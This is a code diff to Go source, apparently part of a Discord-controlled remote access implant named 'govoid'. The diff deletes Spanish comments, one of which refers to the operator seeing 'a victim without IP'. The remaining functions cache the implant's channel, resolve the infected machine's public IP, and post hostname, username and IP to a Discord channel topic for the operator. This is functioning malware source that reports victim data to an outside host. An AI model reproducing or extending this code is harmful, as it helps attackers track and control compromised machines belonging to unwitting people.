@@ -15,11 +15,6 @@ import (
 	"github.com/local/govoid/internal/util"
 )
 
-// channelCache guarda el canal de esta instalación en disco. Sin él, cada
-// arranque depende de listar los canales del gremio por REST; esa llamada se
-// quedó colgada 74 segundos tras un reinicio y el agente nunca llegó a marcar
-// "conectado". Con el ID en disco la sesión está lista al instante y la
-// verificación ocurre después, en segundo plano.
 type channelCache struct {
 	ID  string `json:"id"`
 	Num int    `json:"num"`
@@ -29,7 +24,6 @@ func channelCachePath() string {
 	return filepath.Join(config.StateDir(), "channel.json")
 }
 
-// legacyChannelCachePath es la ruta anterior bajo %APPDATA%.
 func legacyChannelCachePath() string {
 	dir, err := os.UserConfigDir()
 	if err != nil || dir == "" {
@@ -38,13 +32,10 @@ func legacyChannelCachePath() string {
 	return filepath.Join(dir, config.DataDirName, "channel.json")
 }
 
-// cachedChannel devuelve el canal guardado por un arranque anterior.
 func cachedChannel() (string, int) {
 	if c, ok := readChannelCache(channelCachePath()); ok {
 		return c.ID, c.Num
 	}
-	// Migración desde %APPDATA%: se conserva el canal que ya tenía la
-	// instalación en vez de crear otro.
 	if legacy := legacyChannelCachePath(); legacy != "" {
 		if c, ok := readChannelCache(legacy); ok {
 			saveChannel(c.ID, c.Num)
@@ -69,7 +60,6 @@ func readChannelCache(path string) (channelCache, bool) {
 	return c, true
 }
 
-// saveChannel deja el canal listo para el próximo arranque.
 func saveChannel(id string, num int) {
 	path := channelCachePath()
 	if path == "" || id == "" {
@@ -91,9 +81,6 @@ func saveChannel(id string, num int) {
 	}
 }
 
-// refreshCachedSession verifica en segundo plano que el canal cacheado sigue
-// existiendo, refresca el topic y corrige el número si cambió. Nunca bloquea el
-// arranque: si falla, el agente ya está conectado con el canal de la caché.
 func refreshCachedSession(s *discordgo.Session, session *Session) {
 	channels, err := guildChannelsBounded(s, 20*time.Second)
 	if err != nil {
@@ -109,28 +96,17 @@ func refreshCachedSession(s *discordgo.Session, session *Session) {
 		}
 	}
 	if found == nil {
-		// El canal desapareció: se limpia la caché para que el próximo arranque
-		// vuelva a resolverlo por la vía normal.
 		slog.Warn("sessionmgr: el canal cacheado ya no existe", "channel", session.ChannelID)
 		_ = os.Remove(channelCachePath())
 		return
 	}
 
-	// El topic lo escribe resolveCachedIP cuando ya tiene la IP. Escribirlo aquí
-	// también creaba una carrera: esta goroutine leía "desconocida" y su edición
-	// podía aterrizar después de la buena, dejando el canal sin IP para siempre.
 	sessionMu.Lock()
 	session.ConnectedAt = time.Now()
 	sessionMu.Unlock()
 	slog.Debug("sessionmgr: canal verificado", "channel", found.ID)
 }
 
-// resolveCachedIP completa lo que la caché no puede dar: la IP pública.
-//
-// El arranque rápido usa el canal guardado en disco y no consulta nada por
-// red, así que la sesión nacía con IP "desconocida" y el operador veía una
-// víctima sin IP. Se resuelve en segundo plano y se publica el aviso de
-// conexión cuando llega, sin retrasar el arranque.
 func resolveCachedIP(s *discordgo.Session, session *Session) {
 	ip := util.PublicIP(context.Background())
 	if ip == "" || ip == "desconocida" {
@@ -145,8 +121,6 @@ func resolveCachedIP(s *discordgo.Session, session *Session) {
 
 	slog.Info("bot: ip pública resuelta", "ip", ip)
 
-	// El panel se publicó antes de resolver la IP; se corrige aquí para que el
-	// operador no vea "desconocida" en un panel ya vivo.
 	updatePanelIP(s, session)
 
 	if _, err := channelEditBounded(s, channelID, &discordgo.ChannelEdit{
@@ -163,7 +137,6 @@ func resolveCachedIP(s *discordgo.Session, session *Session) {
 	})
 }
 
-// topicFor arma el topic que identifica la instancia dentro del canal.
 func topicFor(hostname, username, publicIP string) string {
 	return hostname + " | " + username + " | " + publicIP + " | " + instanceID +
 		" | conectado " + time.Now().UTC().Format(time.RFC3339)
